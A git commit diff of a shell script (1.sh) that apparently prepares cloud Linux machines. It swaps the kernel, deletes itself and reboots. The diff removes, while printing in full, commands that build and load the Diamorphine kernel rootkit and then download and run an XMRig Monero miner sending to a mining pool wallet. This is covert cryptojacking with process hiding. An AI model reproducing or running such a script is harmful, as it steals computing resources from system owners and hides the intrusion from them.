4b5f9e24d7efdba369f8954a0ac60e4b2ea18e01
Luca Zani <68642373+OverloadedTech@users.noreply.github.com>
2024-07-03 22:31:12 +0200

    a

--- 1.sh
+++ 1.sh
@@ -57,28 +57,10 @@ sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 871920D1991BC93C &
 sudo DEBIAN_FRONTEND=noninteractive apt update && 
 sudo DEBIAN_FRONTEND=noninteractive apt upgrade -y && 
 sudo DEBIAN_FRONTEND=noninteractive apt-get install zip p7zip-full unzip git htop tmux cpulimit build-essential tmux -y && 
-##sudo DEBIAN_FRONTEND=noninteractive apt-get remove -y linux-image-6.1.0-21-cloud-amd64 linux-image-6.1.0-22-cloud-amd64 linux-image-cloud-amd64 && 
+sudo DEBIAN_FRONTEND=noninteractive apt-get remove -y linux-image-6.1.0-21-cloud-amd64 linux-image-6.1.0-22-cloud-amd64 linux-image-cloud-amd64 && 
 
-##sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-headers-5.15.0-107 -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-headers-5.15.0-107-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-headers-5.15.0-113 -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-headers-5.15.0-113-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-headers-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-headers-virtual -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-image-5.15.0-107-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-image-5.15.0-113-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-image-virtual -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-modules-5.15.0-107-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-modules-5.15.0-113-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-virtual -y && 
+sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-headers-5.15.0-107 -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-headers-5.15.0-107-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-headers-5.15.0-113 -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-headers-5.15.0-113-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-headers-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-headers-virtual -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-image-5.15.0-107-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-image-5.15.0-113-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-image-virtual -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-modules-5.15.0-107-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-modules-5.15.0-113-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-virtual -y && 
 cd && 
 #wget 2.sh && 
-##rm ./1.sh && 
-##sudo DEBIAN_FRONTEND=noninteractive update-grub && sudo reboot now
-
-
-git clone https://github.com/OverloadedOpRK/Diamorphine && 
-cd Diamorphine && 
-sudo make && 
-sudo insmod diamorphine.ko && 
-wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-noble-x64.tar.gz &&
-tar -xf xmrig-6.21.3-noble-x64.tar.gz && 
-cd xmrig-6.21.3 && 
-rm config.json && 
-#wget https://ftp.gnu.org/gnu/glibc/glibc-2.38.tar.gz && 
-#tar xzf glibc-2.38.tar.gz && 
-#cd glibc-2.38 && 
-#mkdir build && 
-#cd build && 
-#../configure --prefix=/usr/local/glibc-2.38 && 
-#make && sudo make install && 
-./xmrig -o xmr-eu1.nanopool.org:14433 -u 48wKerdf8HaKCgAfh8ACanFBHTa7Td7oQTdTty5gm4vnfvAhdV2cJHtCNwuZDVwKPH448uasLzjZwWsyFqjCW7BWL5Z3zez --tls --coin monero
+rm ./1.sh && 
+sudo DEBIAN_FRONTEND=noninteractive update-grub && sudo reboot now
